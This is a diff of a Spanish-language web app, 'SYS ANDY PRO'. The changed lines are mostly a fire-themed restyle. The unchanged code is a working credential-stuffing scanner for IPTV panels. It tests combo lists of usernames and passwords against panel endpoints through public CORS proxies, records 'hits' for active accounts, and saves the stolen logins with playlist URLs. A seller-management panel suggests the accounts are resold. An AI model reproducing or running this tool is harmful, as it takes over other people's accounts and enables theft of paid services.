@@ -3,29 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYS ANDY PRO - EDICIÓN LEÓN</title>
+    <title>SYS ANDY PRO - LEÓN FUEGO</title>
     <style>
-        /* ========== PALETA LEÓN ========== */
+        /* ========== PALETA LEÓN NEGRO + FUEGO (sin celeste) ========== */
         :root {
-            --bg-principal: #1a0b00;      /* Negro cálido */
-            --bg-tarjeta: #2c1a0a;        /* Marrón oscuro */
-            --bg-inputs: #4a2a10;         /* Marrón anaranjado */
-            --texto-principal: #fff3e0;
-            --texto-secundario: #ffcc80;
-            --verde-hit: #ffaa00;          /* Dorado para hits */
+            --bg-principal: #0a0500;      /* Negro león */
+            --bg-tarjeta: #1f1205;        /* Marrón quemado */
+            --bg-inputs: #2a1a0a;         /* Tierra oscura */
+            --texto-principal: #ffe6cc;
+            --texto-secundario: #ffaa55;
+            --verde-hit: #ffaa00;          /* Dorado */
             --rojo-stop: #d32f2f;
-            --azul-boton: #ff6f00;         /* Naranja fuerte */
-            --borde-neon: #ff9900;          /* Dorado neón */
+            --azul-boton: #ff5500;         /* Naranja fuego */
+            --borde-neon: #ff6600;         /* Naranja intenso */
             --fuego-grad: linear-gradient(135deg, #ff7e00, #ff4500, #ff0000);
-            --oro-grad: linear-gradient(135deg, #ffd700, #ffb300);
+            --oro-grad: linear-gradient(135deg, #ffaa00, #ff6600);
+            --llama-grad: radial-gradient(circle, #ff9900, #ff3300);
         }
 
         body {
-            background-color: var(--bg-principal);
+            background: radial-gradient(circle at 20% 30%, #1a0a00, #000000);
             color: var(--texto-principal);
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
             padding: 0;
+            min-height: 100vh;
         }
 
         /* Pantalla de Login */
@@ -37,7 +39,7 @@
             min-height: 100vh;
             padding: 20px;
             box-sizing: border-box;
-            background: radial-gradient(circle at center, #2c1a0a, #0a0500);
+            background: radial-gradient(circle at center, #2a1a0a, #000000);
         }
         .auth-box {
             background-color: var(--bg-tarjeta);
@@ -46,7 +48,8 @@
             padding: 30px;
             width: 100%;
             max-width: 400px;
-            box-shadow: 0 0 30px rgba(255, 153, 0, 0.6);
+            box-shadow: 0 0 30px #ff5500, inset 0 0 10px rgba(255, 85, 0, 0.3);
+            backdrop-filter: blur(2px);
         }
 
         /* Contenedor Principal */
@@ -56,13 +59,13 @@
 
         /* Barra de navegación superior */
         .navbar {
-            background-color: var(--bg-tarjeta);
+            background-color: #0d0600;
             display: flex;
             justify-content: space-between;
             align-items: center;
             padding: 10px 15px;
-            border-bottom: 3px solid #ff9900;
-            box-shadow: 0 0 15px rgba(255, 153, 0, 0.5);
+            border-bottom: 3px solid #ff7b00;
+            box-shadow: 0 0 20px #ff5500;
         }
 
         .logo-area {
@@ -72,18 +75,18 @@
         }
 
         .logo-title {
-            font-size: 1.5rem;
+            font-size: 1.6rem;
             font-weight: bold;
             background: var(--oro-grad);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            text-shadow: 0 0 5px #ff7e00;
+            text-shadow: 0 0 8px #ff5500;
         }
 
         .logo-sub {
             font-size: 0.85rem;
-            color: #ffaa33;
+            color: #ffaa55;
         }
 
         .btn-salir {
@@ -91,16 +94,17 @@
             color: white;
             border: none;
             padding: 6px 12px;
-            border-radius: 4px;
+            border-radius: 8px;
             cursor: pointer;
             font-weight: bold;
+            transition: 0.1s linear;
         }
 
         /* Pestañas */
         .tabs-container {
             display: flex;
             background-color: #1a0f05;
-            border-bottom: 1px solid #ff7e00;
+            border-bottom: 2px solid #ff7e00;
             overflow-x: auto;
         }
 
@@ -109,19 +113,19 @@
             padding: 12px;
             background: none;
             border: none;
-            color: var(--texto-secundario);
+            color: #ffaa66;
             font-weight: bold;
             cursor: pointer;
             text-align: center;
             white-space: nowrap;
-            transition: all 0.2s;
+            transition: 0.2s;
         }
 
         .tab-btn.active {
-            color: #ffcc00;
+            color: #ffcc44;
             border-bottom: 3px solid #ff9900;
-            background-color: var(--bg-tarjeta);
-            text-shadow: 0 0 8px #ff9900;
+            background-color: #2c1a0a;
+            text-shadow: 0 0 6px #ff7700;
         }
 
         /* Paneles */
@@ -150,18 +154,51 @@
         input[type="text"], input[type="password"], input[type="number"], textarea, select {
             width: 100%;
             padding: 10px;
-            background-color: var(--bg-inputs);
-            border: 2px solid #ffaa33;
+            background-color: #1f1205;
+            border: 2px solid #ff7733;
             border-radius: 10px;
-            color: #fff3e0;
+            color: #ffe6cc;
             box-sizing: border-box;
             font-size: 1rem;
             transition: 0.2s;
         }
         input:focus, textarea:focus, select:focus {
-            border-color: #ff5500;
-            box-shadow: 0 0 10px #ff9900;
+            border-color: #ffaa33;
+            box-shadow: 0 0 12px #ff9900;
             outline: none;
+        }
+
+        /* BOTONES CON EFECTO DE CANDELA / LLAMA AL APLASTAR */
+        .btn-block, .btn-small, .btn-salir {
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.05s linear, box-shadow 0.1s;
+        }
+        /* Efecto al presionar (activo) - simula explosión de fuego */
+        .btn-block:active, .btn-small:active, .btn-salir:active {
+            transform: scale(0.96);
+            box-shadow: 0 0 0 2px #ffcc00, 0 0 0 6px rgba(255, 102, 0, 0.6);
+            transition: 0.02s;
+        }
+        /* Llama animada que aparece al hacer clic (pseudo-elemento) */
+        .btn-block:active::after, .btn-small:active::after, .btn-salir:active::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100px;
+            height: 100px;
+            background: radial-gradient(circle, #ffaa00, #ff3300, transparent);
+            border-radius: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            animation: flamePop 0.3s ease-out forwards;
+            pointer-events: none;
+            z-index: 2;
+        }
+        @keyframes flamePop {
+            0% { transform: translate(-50%, -50%) scale(0); opacity: 0.9; }
+            70% { transform: translate(-50%, -50%) scale(1.5); opacity: 0.6; }
+            100% { transform: translate(-50%, -50%) scale(2); opacity: 0; }
         }
 
         .btn-block {
@@ -170,33 +207,30 @@
             font-size: 1.1rem;
             font-weight: bold;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             margin-bottom: 10px;
             cursor: pointer;
             color: white;
             background: var(--fuego-grad);
-            box-shadow: 0 0 12px rgba(255, 68, 0, 0.6);
-            transition: transform 0.1s;
+            box-shadow: 0 0 12px #ff5500;
         }
-        .btn-block:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 20px #ff5500;
-        }
-        .btn-start { background: linear-gradient(135deg, #00bfa5, #00897b); box-shadow: 0 0 10px #00bfa5; }
+        .btn-start { background: linear-gradient(135deg, #00bfa5, #00897b); box-shadow: 0 0 12px #00bfa5; }
         .btn-stop { background: linear-gradient(135deg, #d32f2f, #b71c1c); }
         .btn-save { background: linear-gradient(135deg, #ff6f00, #e65100); }
-        .btn-action { background: linear-gradient(135deg, #ffb300, #ff8f00); }
-        .btn-block:disabled { background: #555; color: #aaa; box-shadow: none; transform: none; }
+        .btn-action { background: linear-gradient(135deg, #ffaa00, #ff7700); }
+        .btn-block:disabled { background: #444; box-shadow: none; transform: none; }
+        .btn-block:disabled:active::after { display: none; }
 
         .item-list { margin-top: 15px; }
         .item-card {
-            background-color: var(--bg-tarjeta);
-            border: 1px solid #ffaa33;
+            background-color: #1f1205;
+            border: 2px solid #ff7733;
             border-radius: 12px;
             padding: 12px;
             margin-bottom: 10px;
-            box-shadow: 0 0 8px rgba(255, 153, 0, 0.3);
+            box-shadow: 0 0 10px rgba(255, 85, 0, 0.4);
         }
+
         .item-actions { display: flex; gap: 8px; margin-top: 8px; }
         .btn-small {
             padding: 6px 12px;
@@ -207,18 +241,18 @@
             color: white;
             font-weight: bold;
         }
-        .btn-edit { background-color: #ffb300; }
+        .btn-edit { background-color: #ffaa33; }
         .btn-del { background-color: var(--rojo-stop); }
         .btn-copy { background-color: #00bfa5; }
 
         /* Jobs escáner */
         .job-card {
             background-color: #0d0600;
-            border: 2px solid #ff7b00;
+            border: 2px solid #ff7700;
             border-radius: 12px;
             padding: 12px;
             margin-bottom: 15px;
-            box-shadow: 0 0 15px rgba(255, 100, 0, 0.5);
+            box-shadow: 0 0 15px rgba(255, 100, 0, 0.6);
         }
 
         .job-header {
@@ -228,7 +262,7 @@
             margin-bottom: 6px;
         }
 
-        .yellow-hit { color: #ffcc00; text-shadow: 0 0 8px #ffaa00; font-weight: bold; }
+        .yellow-hit { color: #ffcc00; text-shadow: 0 0 6px #ffaa00; font-weight: bold; }
 
         .progress-bar-bg {
             background-color: #2a1a0a;
@@ -239,7 +273,7 @@
         }
 
         .progress-bar-fill {
-            background: linear-gradient(90deg, #ff9900, #ff5500);
+            background: linear-gradient(90deg, #ff9900, #ff4400);
             height: 100%;
             width: 0%;
             transition: width 0.3s ease;
@@ -260,7 +294,7 @@
 
         .hit-block {
             background-color: #000000cc;
-            border: 2px solid #ff9900;
+            border: 2px solid #ff8800;
             border-radius: 12px;
             padding: 12px;
             margin-bottom: 12px;
@@ -310,8 +344,8 @@
 
 <div id="auth-screen">
     <div class="auth-box">
-        <h2 style="text-align:center;background:linear-gradient(135deg,#ffaa33,#ff5500);-webkit-background-clip:text;background-clip:text;color:transparent;margin-top:0;">🦁 SYS ANDY PRO - LEÓN EDITION</h2>
-        <p style="text-align:center;color:var(--texto-secundario);font-size:0.9rem;">Ingresa tus credenciales de acceso</p>
+        <h2 style="text-align:center;background:linear-gradient(135deg,#ffaa33,#ff5500);-webkit-background-clip:text;background-clip:text;color:transparent;margin-top:0;">🦁 SYS ANDY PRO - LEÓN FUEGO</h2>
+        <p style="text-align:center;color:var(--texto-secundario);font-size:0.9rem;">Ingresa tus credenciales</p>
         <div class="form-group">
             <label>Usuario o Correo Electrónico:</label>
             <input type="text" id="loginEmail" placeholder="ej: andyobregon799@gmail.com">
@@ -458,7 +492,7 @@
     <div id="panel-admins" class="panel">
         <h3>👥 Panel Maestro: Agregar Nuevos Vendedores</h3>
         <div class="item-card" style="border:2px solid var(--borde-neon)">
-            <p style="color:#ffeb3b; font-weight:bold; margin-top:0;">Crear cuenta de acceso inmediato:</p>
+            <p style="color:#ffaa33; font-weight:bold; margin-top:0;">Crear cuenta de acceso inmediato:</p>
             <div class="form-group">
                 <label>Usuario o Correo del Vendedor:</label>
                 <input type="text" id="newAdminEmail" placeholder="ej: pericoverde@gmail.com">
@@ -617,11 +651,9 @@
     function usarUrlEscanner(idx){ let baseUrls=JSON.parse(localStorage.getItem('sys_urls')); document.getElementById('hostInput').value=baseUrls[usernameClave][idx].split(" - ")[0].trim(); switchTab('scanner'); }
     function eliminarUrl(idx){ let baseUrls=JSON.parse(localStorage.getItem('sys_urls')); baseUrls[usernameClave].splice(idx,1); localStorage.setItem('sys_urls',JSON.stringify(baseUrls)); renderizarUrlsBloc(); }
 
-    // Guardar hit con FECHA y HORA
     function guardarHitEnBanco(hitTexto, user, pass) {
         const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits')) || {};
         if(!baseHits[usernameClave]) baseHits[usernameClave] = [];
-        // Evitar duplicados exactos (mismo user y pass) en el mismo día? Mejor no duplicar en general.
         const yaExiste = baseHits[usernameClave].some(h => h.user === user && h.pass === pass);
         if (yaExiste) return;
         const ahora = new Date();
@@ -644,7 +676,6 @@
         container.innerHTML = '';
         const misHits = baseHits[usernameClave] || [];
         if(misHits.length === 0) { container.innerHTML = '<p style="color:#ffaa66;">No hay hits guardados.</p>'; return; }
-        // Ordenar por fecha descendente (más reciente primero)
         misHits.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
         misHits.forEach(h => {
             const div = document.createElement('div');
@@ -685,23 +716,17 @@
     }
 
     // ==================== ESCÁNER MEJORADO CON SONIDO GEMIDO Y PROXIES ====================
-    // --- Sonido de gemido con Web Audio (sin archivos externos) ---
     let moanAudioContext = null;
     function playMoanSound() {
         if(!document.getElementById('soundToggle').checked) return;
         try {
-            if(!moanAudioContext) {
-                moanAudioContext = new (window.AudioContext || window.webkitAudioContext)();
-            }
-            if(moanAudioContext.state === 'suspended') {
-                moanAudioContext.resume();
-            }
+            if(!moanAudioContext) moanAudioContext = new (window.AudioContext || window.webkitAudioContext)();
+            if(moanAudioContext.state === 'suspended') moanAudioContext.resume();
             const now = moanAudioContext.currentTime;
             const osc = moanAudioContext.createOscillator();
             const gain = moanAudioContext.createGain();
             osc.connect(gain);
             gain.connect(moanAudioContext.destination);
-            // Simular gemido: frecuencia modulada ascendente y descendente
             osc.type = 'sine';
             osc.frequency.setValueAtTime(400, now);
             osc.frequency.exponentialRampToValueAtTime(800, now + 0.15);
@@ -710,12 +735,10 @@
             gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.8);
             osc.start();
             osc.stop(now + 0.8);
-            // Pequeña vibración (opcional)
             if(navigator.vibrate) navigator.vibrate(200);
         } catch(e) { console.log("Audio error", e); }
     }
 
-    // Lista amplia de proxies CORS
     const CORS_PROXIES = [
         'https://api.allorigins.win/raw?url={url}',
         'https://corsproxy.io/?{url}',
@@ -777,7 +800,6 @@
         throw new Error('All proxies failed');
     }
 
-    // Extraer combo de línea
     function extractCombo(line){
         if(!line) return null;
         let s = line.trim();
@@ -785,7 +807,6 @@
         return m ? [m[1].trim(), m[2].trim()] : null;
     }
 
-    // Variables globales del escáner
     const hostInput = document.getElementById('hostInput');
     const concurrencyInput = document.getElementById('concurrencyInput');
     const startBtn = document.getElementById('startBtn'), stopBtn = document.getElementById('stopBtn'), saveBtn = document.getElementById('saveBtn');
@@ -820,9 +841,7 @@
                     const res = await fetchWithCors(url, { cache: 'no-store' });
                     const data = await res.json();
                     if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
-                        // HIT ENCONTRADO --> SONIDO DE GEMIDO
                         playMoanSound();
-
                         const info = data.user_info;
                         const expDate = info.exp_date ? new Date(info.exp_date * 1000).toLocaleString('sv-SE') : 'Ilimitado';
                         const texto = `Host ➤ http://${host}
@@ -842,14 +861,12 @@
 ╰─➤    
 ╭─➤ 🄼➂🅄 
 ├  http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
-
                         HITS[jobId].push({ user, pass, texto });
                         countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
                         const div = document.createElement('div');
                         div.className = 'hit-block';
                         div.innerHTML = `<div class="hit-header">👤 ${user} : ${pass}</div><pre class="hit-content">${texto}</pre>`;
                         hitsContainer.prepend(div);
-                        // Guardar en banco con fecha/hora actual
                         guardarHitEnBanco(texto, user, pass);
                     }
                 } catch(e) {}
@@ -887,7 +904,6 @@
 
     startBtn.addEventListener('click', async () => {
         if(isRunning) return;
-        // Reactivar audio si estaba suspendido
         if(moanAudioContext && moanAudioContext.state === 'suspended') await moanAudioContext.resume();
         isRunning = true; stopRequested = false;
         startBtn.disabled = true; stopBtn.disabled = false;
